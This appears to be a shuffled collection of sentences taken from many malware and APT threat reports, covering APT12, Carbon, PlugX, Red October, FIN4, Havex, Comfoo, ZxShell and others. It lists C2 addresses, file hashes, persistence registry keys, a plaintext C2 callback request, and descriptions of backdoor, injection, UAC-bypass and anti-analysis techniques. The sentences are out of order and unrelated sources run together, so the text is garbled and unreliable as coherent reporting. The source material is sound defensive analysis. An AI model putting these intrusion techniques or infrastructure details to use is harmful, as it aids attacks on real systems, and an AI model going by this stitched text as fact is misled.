PWC explain it pretty well : the URI is made of some sort of Base64-encoded strings with the middle one being the seed to be associated to the master key to decrypt the whole thing .
) The real difference lies in the obfuscation of the filename : LeoUncia was using a plain-text filename ( `` readx '' ) , whereas OrcaRat is obfuscating ( just the same way it obfuscates the Campaign ID ) this data : the filename is `` wbt.dat '' ( obfuscated string XORed character-by-character with the XOR key `` product '' ) and it is located in the `` App Data '' folder of the user OrcaRat is running with .
The LeoUncia sample studied by FireEye includes a perfect English string : `` \r\nThe Remote Shell Execute : % s completed ! \r\n '' Unfortunately , we can not find this string in the OrcaRat sample .
Dealing with OrcaRat , we have seen the following algorithm : When we talk about LeoUncia , we can have a look at the blog posts made by FireEye back in December 2010 , especially the second one , where some assembly code has been screenshot from IDA without ever giving the name of the underlying algorithm : yes , it is RC4 ! Once decoded from Base64 , the binary data we obtain from the URI is comprised of two parts : the first 16 bytes are the decryption key , and the rest of the data is the information to be decrypted .
Let 's face it : It looks a lot like : What about it ? Could it be the same kind of things , huh ? Let 's dig a little deeper inside the code to check if it is just some sort of coincidence or if it is indeed the same code that is behind these two pieces of malware .
What can we find in LeoUncia that is to be found in OrcaRat too ? First , let 's have a look at the URI decryption routine .
The backdoor had the following properties : The backdoor connects to a command and control server at icc [ .
The RIPTIDE exploit document drops its executable file into the C : \Documents and Settings\ { user } \Application Data\Location folder while the HIGHTIDE exploit document drops its executable file into the C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\ folder .
From October 2012 to May 2014 , FireEye observed APT12 utilizing RIPTIDE , a proxy-aware backdoor that communicates via HTTP to a hard-coded command and control ( C2 ) server .
When the file is opened , it drops HIGHTIDE in the form of an executable file onto the infected system .
Similar to RIPTIDE and HIGHTIDE , the WATERSPOUT backdoor is an HTTP-based backdoor that communicates with its C2 server .
The exploit document dropped the HIGHTIDE backdoor with the following properties : The HIGHTIDE backdoor connected directly to 141.108.2.157 .
The same `` Tran Duy Linh '' Microsoft Word Exploit Kit was used in delivery of this backdoor .
This malicious Word document had an MD5 of 499bec15ac83f2c8998f03917b63652e and dropped a backdoor to C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\word.exe .
Similar to the newly discovered HIGHTIDE samples documented above , this malicious document dropped a backdoor to C : \DOCUMENTS and SETTINGS\ { user } \LOCAL SETTINGS\Temp\word.exe .
Although there are no current infrastructure ties to link this backdoor to APT12 , there are several data points that show a possible tie to the same actors : Same initial delivery method ( spear phishing email ) with a Microsoft Word Document exploiting CVE-2012-0158 .
cmd.exe /Q is executed in the module XPlugTelnet in order to start a telnet server on the attacked machine .
Sample B , when executed , attempts to load a ﬁle McUtil.DLL from the same directory , which usually is another component of McAfee .
The entropy of this ﬁle is 7.997904 bits per byte : The code , when executed , reveals the ﬁrst hint about what we found : It decompresses and decrypts itself , using the Microsoft API call RtlDecompressBuﬀer and the custom decryption routine : The decrypted and decompressed ﬁle is not written onto disk , it always remains in memory .
In a next step , svchost.exe is instructed to execute the original msiexec.exe from Microsoft , where also memory is injected like it has been done for svchost.exe .
In the environment of Windows 7 , the malware drops temporarily ﬁle Sample F , which it uses to evade or defeat the UAC mechanism .
It is able to capture the screen ( internal command : ScreenT1 ) and can send mouse and keyboard events ( internal command : ScreenT2 ) .
XPlugRegedit implements a set of commands to process the Windows registry .
A remote shell for the attacker is created in the module XPlugShell , by creating an asynchronous set of pipes ( \pipe\a and \pipe\b ) for cmd.exe and the console attached to it ( AttachConsole ( ) ) .
Sample A is a self-extracting archive which contains three ﬁles , Sample B , Sample C and Sample D. It is assumed that Sample A is a part of another attack vector , like PDF or Oﬃce document attacks where the user just opens a crafted document which exploits the document reader , drops and opens both a readable document and a malicious ﬁle like Sample A. Executing the self-extracting archive extracts the ﬁles and runs mcvsmap.exe ( Sample B ) .
After some initialisation work like adjusting tokens ( SeDebugPrivilege , SeTcbPrivileg6 , to act as part of the operating system ) , a new process is started , the original svchost.exe from Microsoft , and the code from Sample E is injected into the memory of that process .
The function create_from_resources ( ) looks like : Subsequently , after dropping the correct ﬁles , the malware makes itself persistent on the system and creates a service with the following parameters , which loads the ﬁle usbdev.sys as a kernel driver : If during installation anything goes wrong , the registry keys are deleted .
Sample A can be considered an installer or dropper .
In this module , the following transport or communication modules are present : Type 1 : tcp , b2m Type 2 : np , frag , m2b This corresponds to the transports found in Sample D. The compiled code of bzip2/libbzip2 , a program and library for lossless block-sorting data compression , was identiﬁed , coming from http : //svn.apache.org/repos/asf/labs/axmake/trunk/src/libuc++/srclib/bzip2/compress.c .
Global\411A5195CD73A8a710E4BB16842FA42C is used to exclusively access temporary ﬁles Global\MSDBG.Global.MUTEX.ATF is used to exclusively access \.\IdeDrive1\log.txt Global\WindowsShellHWDetection is used to exclusively access \.\IdeDrive1\Results\result.txt Global\MSCTF.Shared.MUTEX.RPM is used to exclusively access \.\IdeDrive1\Tasks\task.txt Global\881F0621AC59C4c035A5DC92158AB85E is used to exclusively access \.\IdeDrive1\Tasks \task_system.txt During the startup of the ModuleStart ( ) function , 6 threads are being started .
frag.np and frag.tcp replies : SEND AUTH RECV AUTH AUTH FAILED SEND WHO SEND OBJECT_ID frag.np/frag.tcp options : frag_size=32768 frag_no_scrambling=1 allow=*everyone active_con net_user= net_password= write_peer_nfo= % c % s % c nodelay=N \\.\IdeDrive1\ \\.\IdeDrive1\log.txt \\.\IdeDrive1\*.bak \\.\IdeDrive1\Tasks\\task.txt \\.\IdeDrive1\Tasks\\task_system.txt \\.\IdeDrive1\Tasks\\*.tmp \\.\IdeDrive1\config.txt \\.\IdeDrive1\restrans.txt \\.\IdeDrive1\Tasks\\ \\.\IdeDrive1\Results\\ \\.\IdeDrive1\logtrans.txt \\.\IdeDrive1\usbdev.bak \\.\IdeDrive1\inetpub.bak \\.\IdeDrive1\inetpub.dll \\.\IdeDrive1\cryptoapi.bak \\.\IdeDrive1\cryptoapi.dll \\.\IdeDrive1\Plugins\\ \\\\.\\Global\\PIPE\\comnode \\\\ % s\\pipe\\comnode \\\\ % s\\pipe\\ % s CUSTOM_ERROR_01 = 21590001h CUSTOM_ERROR_02 = 21590002h ; WAIT_TIMEOUT ? CUSTOM_ERROR_03 = 21590003h ; BROKEN_PIPE ? CUSTOM_ERROR_04 = 21590004h CUSTOM_ERROR_05 = 21590005h CUSTOM_ERROR_06 = 21590006h CUSTOM_ERROR_07 = 21590007h CUSTOM_ERROR_08 = 21590008h CUSTOM_ERROR_09 = 21590009h CUSTOM_ERROR_0A = 2159000Ah CUSTOM_ERROR_0B = 2159000Bh ; INVALID_USER_BUFFER ? CUSTOM_ERROR_0D = 2159000Dh CUSTOM_ERROR_64 = 21590064h CUSTOM_ERROR_65 = 21590065h CUSTOM_ERROR_66 = 21590066h CUSTOM_ERROR_67 = 21590067h CUSTOM_ERROR_68 = 21590068h CUSTOM_ERROR_69 = 21590069h CUSTOM_ERROR_C9 = 215900C9h ; NO_VALID_ADDR ? CUSTOM_ERROR_CA = 215900CAh ; NO_VALID_PORT ? CUSTOM_ERROR_CB = 215900CBh CUSTOM_ERROR_CC = 215900CCh Original ﬁlename : CARBON.dll Internal name : Carbon v3.51 \\.\IdeDrive1\config.txt \\.\IdeDrive1\Tasks\\task.txt \\.\IdeDrive1\Tasks\\task_system.txt \\.\IdeDrive1\log.txt \\.\IdeDrive1\Results\result.txt Global\\MSMMC.StartupEnvironment.PPT Global\\411A5195CD73A8a710E4BB16842FA42C Global\\881F0621AC59C4c035A5DC92158AB85E Global\\MSCTF.Shared.MUTEX.RPM Global\\WindowsShellHWDetection Global\\MSDBG.Global.MUTEX.ATF thread 2 : In a 10 minutes loop check server availability by doing a HTTP POST ( HTTP/1.0 ) to a server/port conﬁgured in \\.\IdeDrive1\config.txt in CW_INET section address with user agent Mozilla/4.0 ( compatible ; MSIE 6.0 ) but only if a valid internet connection was successfully probed : thread 3 : The actions described below are only taken if the following programs are not running tcpdump.exe windump.exe ethereal.exe wireshark.exe ettercap.exe snoop.exe The following is the main ( endless ) loop of this thread : It starts in do_HTTP_GET ( ) with a HTTP GET ( HTTP/1.1 ) to server/port taken from \\.\IdeDrive1\config.txt in CW_INET section address with user agent Mozilla/4.0 ( compatible ; MSIE 6.0 ) with script name and query as follows : auth.cgi ? mode=query & id= % u : % u : % u : % u & serv= % s & lang=en & q= % u- % u & date= % s where the format strings are ﬁlled in accordingly .
Full excerpt below : \Registry\Machine\usblink_export HKEY_LOCAL_MACHINE\usblink_export ( also LEGACY_usblink and usblink ? ) The malware checks if the queried process has one of the following names and if so , it would call pulse_event_wininet_activate ( ) .
Right after it creates directories on the VFS : CreateDirectoryA ( `` \\\\.\\IdeDrive1\\\\Tasks\\ '' , ( LPSECURITY_ATTRIBUTES ) & Dst ) ; CreateDirectoryA ( `` \\\\.\\IdeDrive1\\\\Results\\ '' , ( LPSECURITY_ATTRIBUTES ) & Dst ) ; Sample D is the next ﬁle in the logical execution order , as it creates the following mutexes , which are also accessed by Sample E. Sample D can be considered the main userland module , a control unit that sets up the communication with the kernel module and has the ability to load plugins dynamically during runtime .
The ﬁnal destinations are : \.\IdeDrive1\cryptoapi.dll \.\IdeDrive1\inetpub.dll But have a closer look at how they decrypt the string : They are seriously using a key 0x4E415341 to decrypt the string .
During the installation process , extensive logging is ensuring good visibility on potential installation problems .
In the following example , they decrypt ( XOR ) the strings used to assemble the locations of where to drop the other components of the malware to .
The backdoor install file and batch file are copied by network sharing , and the batch file is executed with the work scheduler .
The attacker uses various Reloading Point techniques in order to maintain the connection between the installed back door and the C & C server .
In addition , a method of installing backdoor only in the memory area was applied , since this can avoid the threat detection of security products .
From then on , the attacker uses the same method and installs many back doors in the server network .
The attacker uses various kinds of anti-forensic techniques in order to avoid being disconnected with the C & C server once the back door is discovered .
The copied backdoor is then executed using the work scheduler , and it is operated using the system authority .
The install process is as follows : The attacker will use the acquired ID/Password or NTLM Hash value to create an agreement with the system network to move to , and copy , the back door .
The common functions of each of the back doors are as follows : - System Information and Control - Search option - File transfer to C & C server - Control of process and module - Service control - Registry control - Instant screen capture - Remote control - Command Shell - Proxy function ( open port ) - Keylogging In addition to the above mentioned ways , in order to secure the additional attack route to the network , the ETSO Group uploaded the back door on the internal file server that was openly shared within the company .
The uploaded back door was disguised as a generally used program such as a driver , Office or Chrome install file .
After installation , the backdoor erases all of the files and only exists in the memory while waiting for the system to turn off .
Quickly considering these results in cursory questions reflected as follows : • Command and Control ( C2 ) appears to be accomplished via providing commands in an encrypted file stored on the local 'master ' system ( re : netsat.exe ) .
Based on available analysis results , netsat.exe could collect surreptitiously gathered data from any infected drive connected to the system whereon netsat.exe was running , e.g. , the infected drive would not have to be processed by the same system whereon it became infected .
Essentially , netsat.exe appeared to operate as a master program that infected removable media connected to the system whereon it was running and collected data from infected drives when the drives returned .
The presence of the following files may indicate netsat.exe , et al , involvement : The presence of the following , specifically on removable media , may indicate netsat.exe , et al , involvement : Cursory analysis did not disclose entrenchment data , such as a Registry entry to ensure persistence .
The following table illustrates the hard coded dates in relation to the affected files ' PE dates : The following version information was recorded in the netsat.exe executable : The Language/Code Page code 1033 denotes U.S. English .
These components would potentially perform additional command and control functions and potentially exfiltration from the central host .
netsat.exe's data collection functionality suggested data destined for exfiltration might be collected by the 'master ' system .
If the sample was run after a particular date , it would effectively terminate and delete itself : Analysis disclosed netsat.exe probably serves as the headquarters of malicious activity by : Analysis disclosed netui3.dll/winmgt.dll probably serve as the field units of malicious activity by : The following commands and their descriptions , listed by executable file , illustrate the submitted malware 's functionality : This advisory is based on preliminary information .
This C2 scheme would seem to dictate : o Intruder remote access to the 'master ' system o Intruder local access to the 'master ' system o a C2 delivery/retrieval component , such as another piece of code that downloads a C2 file • Available information precludes determination of the means of exfiltration .
However , evidence of any of the files involved ( MD5 , strings , file names ) traversing the network , e.g. , on the move , may be indicative of netsat.exe , et al presence .
Usually in such cases an attacker will use their access to place an exploit kit on the compromised website , delivering malware to visitors - a technique commonly referred to as setting up a 'watering hole ' or 'strategic web compromise ' .
ScanBox is particularly dangerous as it does n't require malware to be successfully deployed to disk in order to steal information - the keylogging functionality simply requires the JavaScript code to be executed by a web browser .
] com selectively loaded extra plugins from separate files : Figure 1 – The JavaScript function to load additional plugins We can see how these differ by comparing two exploit kits side by side : Figure 2 – foundationssl [ .
The framework also facilitates reconnaissance , enabling attackers to exploit vulnerabilities in visitors systems in a more traditional fashion , by pushing & executing malware .
In this case however , rather than relying on malware , the exploit kit was a self-contained key logger that recorded all keystrokes the user performed while on the website .
qoog1e.com on the right loads JavaScript from separate files A motivation for selectively loading plugins is likely to be to prevent crashes or any errors appearing ( which may alert the compromised site 's owner ) when the page is loaded – as some of the plugins are only compatible with specific browsers .
Selectively loading plugins has the added bonus of slightly reducing access to the attacker 's code to researchers .
Browsers the attackers are not interested in will be served the following placeholder instead of the malicious function : Figure 3 – The empty JavaScript function that the exploit kit delivers when a browser does n't match a targeted browser The following ScanBox plugins are deployed on code.googlecaches [ .
The framework is used by a single group that target widely and upgrade or adapt their code for different targets , and are careful to avoid any overlap in infrastructure or in services used .
shared domains or IP addresses , neither have we been able to determine any softer linkages beyond the reuse of the GoDaddy registrar .
Dropped to % PROFILE % \Application Data\Erease.vbe , that connects to the C & C server .
The document starts with the RTF header stuff , followed by the encrypted second stage .
Additionally , it has some internal function names not seen in earlier Plugx versions : ZX , ZXWT , JP1 , JP2 , JP3 , JP4 , JP5 , JAP0 , JAP1 Dropped to C : \Documents and Settings\All Users\DRM\KavSky\m.exe ( clean loader , digitally signed by Kaspersky ) and C : \Documents and Settings\All Users\DRM\KavSky\msi.dll ( malware loader ) and C : \Documents and Settings\All Users\DRM\KavSky\msi.dll.eng ( payload ) ; registered in for startup as a service in HKLM\SYSTEM\CurrentControlSet\Services\KavSky → ImagePath The payload is next generation Plugx , plugin function creation dates are 20140719 decimal .
Dropped to C : \Documents and Settings\All Users\DRM\AShld\AShld.exe ( clean loader , digitally signed by McAfee ) and C : \Documents and Settings\All Users\DRM\AShld\AShldRes.DLL ( malware loader ) and C : \Documents and Settings\All Users\DRM\AShld\AShldRes.DLL.asr ( payload ) ; registered for startup as a service in HKLM\SYSTEM\CurrentControlSet\Services\ AShld → ImagePath The payload is next generation Plugx , plugin function creation dates are 0x20130810 .
The vulnerability expects the second stage shellcode at a fixed file offset , checks a marker string there ( `` p ! 11 '' ) , and jumps to the second stage , which then decrypts and executes the final Win32 payload .
Regardless of the particular exploit used , both shellcodes performed the memory egg-hunting for the memory markers of the second stage ( as described in ) , and decrypted it when found .
Kamics :712df1f1f11f63e2154eb9023d584be62ef100b8 Original name : N/A The dropped decoy document is a password protected Word file , content is not visible in the lack of the correct password .
a44308788bbd189e532745a79d126feaf708c3cd Original name : ‫ةغللا يف ةعونمو ةماه تاحلطصم‬.doc System activity Dropped to % PROFILE % \Application Data\Yhyq\sied.exe ( random directory and filename ) ; registered for startup in HKCU\Software\Microsoft\Windows\CurrentVersion\Run → Opagw C & C servers www.starorder.ezua.com Dynamic DNS service pop3.sec-homeland.com Domain Status : OK Registry Registrant ID : Registrant Country : China Registrant Name : dfhgewy Registrant Phone : +086.0000 00000000 Registrant Organization : dfhgewy Registrant Phone Ext : Registrant Street : dfhgewy Registrant Fax : +086.0000 00000000 Registrant City : Unknown City Registrant Fax Ext : Registrant State/Province : Unknown Province Registrant Email : joiupnhs @ 163.com Registrant Postal Code : 000000 d05e586251b3a965b9c9af76568eff912e16432f Original name : ‫كرابملا ىحضالا ديعب ةئنهت‬.doc System activity Dropped to % PROFILE % \Application Data\Hysyt\ydbi.exe ( random directory and filename ) ; registered for startup in HKCU\Software\Microsoft\Windows\CurrentVersion\Run → Pecyiqu C & C servers www.starorder.ezua.com Dynamic DNS service pop3.sec-homeland.com Domain Status : OK Registrant Postal Code : 000000 Registry Registrant ID : Registrant Country : China Registrant Name : dfhgewy Registrant Phone : +086.0000 00000000 Registrant Organization : dfhgewy Registrant Phone Ext : Registrant Street : dfhgewy Registrant Fax : +086.0000 00000000 Registrant City : Unknown City Registrant Fax Ext : Registrant State/Province : Unknown Province Registrant Email : joiupnhs @ 163.com Swrort : fa616b8e2f91810a8d036ba0adca6df50da2ad22 Original name : test.doc System activity Dropped to % PROFILE % \Local Settings\Temp\3.tmp C & C servers During the analysis of this campaign we ran into a handful of samples that have nothing to do with CVE-2014-1761 , but they contained some of the encrypted Zbot at the beginning of the file .
System activity Dropped to % PROFILE % \Local Settings\Temp\msvcpdl100.dll ( SHA1 : 51346d70ea97a7aaef80f98c4891526443b2696c ) and C : \MsBuild\Microsoft\Windows\System32\ svchost.exe ( SHA1 : 2196770391bdbdd15bce5895427ec99b1bef0868 ) ; registered for startup in HKCU\Software\Microsoft\Windows\CurrentVersion\Run → Kaspersky Internet Security C & C servers buglaa.sportnewsa.net Farfli : 960ac7329a6e80682959d6da0469921f8167e79a Original name : MoFA Note- Verbale on 19.8.14.doc System activity Dropped to % PROFILE % \Application Data\winlog.exe ( SHA1 : 511f2055a56c0f458b1b14cc207730d0fe639df4 ) and % PROFILE % \Application Data\winlog.dll ( SHA1 : bb185efd35f7b4892a32e7853e044e94502a36af ) C & C servers unisers.com Domain Status : clientTransferProhibited Registrant State : Beijing Registry Registrant ID : Registrant Postal Code : 100001 Registrant Name : wang cheng Registrant Country : CN Registrant Organization : wang cheng Registrant Phone : +86.01085452454 Registrant Street : BeijingDaguoROAD136 Registrant Fax : +86.01085452454 Registrant City : Beijing Registrant Email : bitumberls .
The first , from Plugx , reads the length of the embedded decoy document and Win32 payload from the end of the file , and using this info locates and decrypts the appended payload .
Notably , one of the commands in the Trojan dropper switches the codepage of an infected machine to 1251 before installation .
The C & C infrastructure is actually a chain of servers working as proxies and hiding the location of the true -mothership- command and control server .
These tasks are provided as PE EXE files and are installed in the infected machine .
The campaign , identified as `` Rocra '' , short for `` Red October '' , is currently still active with data being sent to multiple command-and-control servers , through a configuration which rivals in complexity the infrastructure of the Flame malware .
During lateral movement in a victim 's network , the attackers deploy a module to actively scan the local area network , find hosts vulnerable for MS08-067 ( the vulnerability exploited by Conficker ) or accessible with admin credentials from its own password database .
How many Command & Control servers are there ? Did Kaspersky Lab conduct any forensic analysis on them ? During our investigation , we uncovered more than 60 domain names used by the attackers to control and retrieve data from the victims .
Was the malware limited to only workstations or did it have additional capabilities , such as a mobile malware component ? Several mobile modules exist , which are designed to steal data from several types of devices : These modules are installed in the system and wait for mobile devices to be connected to the victim's machine .
The system is resistant to C & C server takeover and allows the attacker to recover access to infected machines using alternative communication channels .
Some examples include : What kind of information is being hijacked from infected machines ? Information stolen from infected systems includes documents with extensions : txt , csv , eml , doc , vsd , sxw , odt , docx , rtf , pdf , mdb , xls , wab , rst , xps , iau , cif , key , crt , cer , hse , pgp , gpg , xia , xiu , xis , xio , xig , acidcsa , acidsca , aciddsk , acidpvr , acidppr , acidssa .
Did you sinkhole any of the Command & Control servers ? We were able to sinkhole six of the over 60 domains used by the various versions of the malware .
The sun.css file was a malicious executable with an MD5 of bd07926c72739bb7121cec8a2863ad87 and it communicated with the same communications protocol described above to the same command and control server at 180.150.228.102 .
One of these Hitkit samples connected to a command and control server at downloadmp3server [ .
We pivoted off the command and control IP addresses used by these samples and found the following known malicious domains recently pointed to 180.150.228.102 .
This callback traffic is HTTP over port 443 ( which is typically used for HTTPS encrypted traffic ; however , the traffic is not HTTPS nor SSL encrypted ) .
The file , when XORed with 0×95 , was an executable ( MD5 : 8aba4b5184072f2a50cbc5ecfe326701 ) .
The payload was hosted on a server in Hong Kong ( 210.176.3.130 ) and was named `` img20130823.jpg '' .
Upon execution , 8aba4b5184072f2a50cbc5ecfe326701 writes `` 28542CC0.dll '' ( MD5 : 46fd936bada07819f61ec3790cb08e19 ) to this location : C : \Documents and Settings\All Users\Application Data\28542CC0.dll In order to maintain persistence , the original malware adds this registry key : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\28542CC0 The registry key has this value : rundll32.exe `` C : \Documents and Settings\All Users\Application Data\28542CC0.dll '' , Launch The malware ( 8aba4b5184072f2a50cbc5ecfe326701 ) then connects to a host in South Korea ( 180.150.228.102 ) .
Instead , this clear-text callback traffic resembles this pattern : POST /info.asp HTTP/1.1 Content-Type : application/x-www-form-urlencoded Agtid : [ 8 chars ] 08x User-Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Win32 ) Host : 180.150.228.102:443 Content-Length : 1045 Connection : Keep-Alive Cache-Control : no-cache [ 8 chars ] 08x & [ Base64 Content ] The unique HTTP header `` Agtid : '' contains 8 characters followed by `` 08x '' .
Analysis based on our Dynamic Threat Intelligence cluster shows that this current campaign leveraged command and control infrastructure that is related to the infrastructure used in the attack on Bit9 .
Links to Previous Campaigns According to Bit9 , the attackers that penetrated their network dropped two variants of the HiKit rootkit .
This file , when opened , exploits one of the above mentioned vulnerabilities and drops the payload file `` msmx21.exe '' .
C & C Server : 29f2aad01fee3663.com McAfee has coverage for this exploit CVE-2011-3544 and detects the downloaded payload used in the targeted attack as BackDoor-FJJ .
Svchost.exe is an installer component that decrypts and loads the main backdoor ( wsdktr.ltp ) .
msmx21.exe creates and executes the following files : % Temp % \msc.bat % ProgramFiles % \Windows NT\svchost.exe % ProgramFiles % \Windows NT\wsdktr.ltp ( Encrypted payload ) - > random name The dropped batch file has the following content : The use of `` chcp 1251 '' in the batch file is to switch the codepage of an infected system to handle Cyrillic characters .
The collected information is stored as an encrypted content and sent to the command & control server .
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon `` Userinit '' '' C : \WINDOWS\system32\userinit.exe , '' '' C : \WINDOWS\system32\userinit.exe , C : \Program Files \WindowsNT\svchost.exe '' HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Zeemav : `` '' C : \Documents and Settings\Home\Application Data\Keucot\qagi.exe '' '' Users are requested to exercise caution while opening unsolicited emails and unknown links .
The batch file has the following content : The payload injects itself to the running system processes in the machine .
The following domains are used for C & C : nt-windows-online.com nt-windows-update.com nt-windows-check.com csrss-check-new.com In Java Rhino Script Engine Vulnerability , security manager is disabled during JavaScript execution , which would enable full permission to the system during its execution .
The payloads used in the exploitation are mostly backdoors and password stealers that steal the user 's information and send it in an encrypted form to the remote attacker .
The following registry entry would enable the Trojan to execute every time when Windows starts .
Figure 9 : Malicious Dialogue that Prompts for User 's Credentials Figure 10 : POST Request Containing User 's Credentials Sent to C2 Networking and Infrastructure After the user enters data into the username and password fields , the data is transmitted to the C2 server via a POST request ( Figure 10 ) .
These campaign codes are transmitted to FIN4's command and control ( C2 ) servers along with stolen credentials .
We have also observed this group send emails with links to fake Outlook Web App ( OWA ) login pages that will also steal the user 's credentials , however we have not observed this tactic in recent months .
Additionally , enabling two-factor authentication for OWA and any other remote access mechanisms can help prevent credentials stolen in this manner from being leveraged successfully .
What Can Network Defenders Do ? The relative simplicity of FIN4 's tactics ( spearphishing , theft of valid credentials , lack of any malware installed on victim machines ) makes their intrusion activity difficult to detect .
Embedded in each Microsoft Word or Excel document is a malicious macro that prompts the user for their Outlook credentials .
FIN4 then uses the collected credentials to login to victim email accounts .
FIN4 appears to be heavily reliant on Tor ( software that enables users to browse the Internet anonymously by encrypting their internet traffic and routing it through servers around the world ) and has been seen using Tor to login to victims' email accounts after obtaining the compromised user credentials .
In addition to gaining access to the victim 's private communications , FIN4 also uses the compromised accounts to email malicious documents to additional targets inside and outside the victim company .
FIN4 employs a simple , yet effective , method to gather targets ' user credentials through their spearphishing emails .
All of these files were infected with the known Trojan Virus Havex Rat .
The most recent company known to have their software infected with the Havex backdoor was the German company MB Connect Line GmbH , who are known for their industrial router mbNET and VPN service mbCONNECT24 .
The corrupted eCatcherSetup.exe contained a malware which could , under restricted conditions , compromise the Talk2M login of the infected user .
The files mbCHECK ( Europe ) , VCOM_LAN2 and mbCONFTOOL have been replaced with infected files .
A corrupted eCatcherSetup.exe file had been uploaded into the CMS ( Content Management System ) of www.ewon.biz web site .
In my 4SICS talk I disclosed a previously unpublished comprehensive view of ICS software that has been trojanized with the Havex backdoor , complete with screenshots , version numbers and checksums .
Prior to version 2.0 of Joel 's Dragonfly report , eCatcher was the only product from eWON known to be infected with the Havex backdoor .
eCatcher download hyperlinks were rerouted to this corrupted file .
The Havex backdoor is developed and used by a hacker group called Dragonfly , who are also known as '' Energetic Bear '' and `` Crouching Yeti '' .
Monday , 27 October 2014 11:11:00 ( UTC/GMT ) I did a presentation at the 4SICS conference earlier this week , where I disclosed the results from my analysis of the Havex RAT/backdoor ( slides available here ) .
Once executed it drops and launches a batch script in a % Temp % subfolder with the following content : As you can see , it enforces some configuration in the registry in order to hide file extensions and not show hidden folders .
Subsequently the malware creates and launches a Cabinet Self-Extractor , which drops two additional executable files : one embedding either a PDF or a Microsoft Office Word document , the other being the actual backdoor .
The main backdoor installed and executed on the victims ' systems appears to be a custom reverse shell with just a handful of features .
In order to get some fun out of an overall straightforward analysis , I quickly hacked together a Python script that emulates a ByeBye backdoor - following is the code : As you can see , this script simply tries to emulate the basic functionality of ByeBye : it performs the initial check-in and waits for incoming messages from the operator .
After some quick initialization , the backdoor XORs an embedded string with 0x9D to extract the IP address of the C & C server .
The samples are also signed with an invalid Microsoft Windows certificate , which can be used for further fingerprinting : In all the cases presented in this blog post , the backdoors tried to connect to the C & C located at 46.165.207.134 , which appears to be a dedicated server hosted by Leaseweb : At the time of writing , the server appears to still be online .
No exploit was used in any of the attacks we attribute to this campaign - the attackers probably just relied on social engineering the victim through well-crafted spearphishing emails .
In the following screenshot you can see how the reverse shell is implemented : it just launches a cmd.exe and pipes stdin , stdout and stderr to the opened socket so that the operator can directly interact with the Windows prompt .
After the check-in message is sent , the malware enters a continuous loop in which it will keep silently waiting for commands from the open socket connection .
When disassembling the binary you can quickly understand the mechanics of the backdoor .
( Source : Dell SecureWorks ) Capabilities The Comfoo RAT has the following features : System/network information gathering Keystroke logging Screenshots File upload/download/execute Command shell By studying the network traffic of infected systems , CTU researchers determined that the server side of the Comfoo malware sends an HTTP server header identifying the server version as `` Apache 2.0.50 ( Unix ) '' .
Network detection A typical Comfoo HTTP phone-home request looks like the following : GET /CWoNaJLBo/VTNeWw11212/12664/12VTNfNmM1aQ/UTWOqVQ132/ HTTP/1.1Accept : image/gif , image/x-xbitmap , image/jpeg , image/pjpeg , */*Accept-Language : en-enUser-Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.1 ) Host : smtp.dynami‐ clink.ddns.usConnection : Keep-AliveCache-Control : no-cache An active C2 server responds with headers similar to the following : HTTP/1.1 200 OKDate : Mon , 29 Jul 2013 19:26:15 GMTServer : Apache/2.0.50 ( Unix ) Content-Length : 10Keep-Alive : timeout=15 , max=90 Disk/memory/registry detection The unique string T1Y943jIhk can be found in the Comfoo binary .
Instead , the master console program connects to the relay server on-demand , and any incoming victim data is passed to the master console connection .
( Source : Dell Se- cureWorks ) Taking control The unauthenticated nature of the Comfoo relay server 's administrative connections makes it possible to take control of the C2 server and all victims ' systems , armed only with knowledge of the protocol , the encryption method , and the static encryption key hard-coded into every Comfoo binary .
This port accepts connections from victims' systems to send data to and receive commands from the Comfoo administrator encapsu- lated in HTTP requests and responses .
It accepts connections from the master console to send commands to and receive data from vic- tims ' systems .
This technique is analogous to viewing webserver log data stored in a publicly accessible directory on a C2 server .
One of the universal aspects of APT attacks is the use of malicious software tools that grant unauthorized backdoor access to computer systems inside the targeted network .
It performs the following tasks : Enables/disables the other ports Accepts new relay port configuration ( stored in rlycfg.dll ) Notifies master console that a new victim connection is available The second port is the admin relay port , which typically listens on port 1689 .
Analysts can search for known Comfoo threat indicators in network traffic , on hard drives , in memory , or in the Win- dows registry .
While other techniques are also utilized to conceal and inhibit its removal , ZxShell 's primary functionality is to act as a Remote Administration Tool ( RAT ) , allowing the threat actor to have continuous backdoor access on to the compromised machine .
ZxShell employs a strange method for communication : it hooks the NtWriteFile API and recognizes 5 different special handle values as commands : 0x111111111 -- Hide `` Loveusd '' driver from the system kernel driver list 0x22222222 -- Securely delete an in-use or no-access target file-name 0x44444444 -- Unhook the ZwWriteFile API and hook KiFastCallEntry 0x55555555 -- Remove the ZxShell Image Load Notify routine 0x88888888 -- Set a special value called `` type '' in Windows registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverMain The second Loveusd system thread does a lot of things .
The ZxShell service is installed as usual , and the in-execution dropper is deleted permanently using the special handle value 0x22222222 for the WriteFile API call .
Further , the keylogging and remote desktop functionality allows the operator to spy on the infected machine , observing all keystrokes and viewing all user actions .
Once an infected machine connects , you see its information displayed in a selection box at the top .
Once the RAT is installed on the host it will be used to administer the client , exfiltrate data , or leverage the client as a pivot to attack an organization 's internal infrastructure .
Being able to transfer and execute files on the infected system means the attacker can run any code they please .
The malware accomplishes this through querying the netsvc group value data located in the svchost group registry key which is HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost .
The protection is enabled to all processes except for ones in the following list : Svchost.exe , Lsass.exe , Winlogon.exe , Services.exe , Csrss.exe , ctfmon.exe , Rundll32.exe , mpnotify.exe , update.exe .
It adds the SeLoadDriver privilege to its access token and proceeds to install the driver as a fake disk filter driver .
In the aforementioned university-related incidents , a legitimate executable named MediaSoft.exe ( MD5 hash : d00b3169f45e74bb22a1cd684341b14a ) loaded a file named msi.dll ( MD5 hash : ae6f33f6cdc25dc4bda24b2bccff79fe ) , which , in turn , was used to load the Sakula executable ( MD5 hash : 0c2674c3a97c53082187d930efb645c2 ) .
The downloaded plugin file included a variant of Sakula malware .
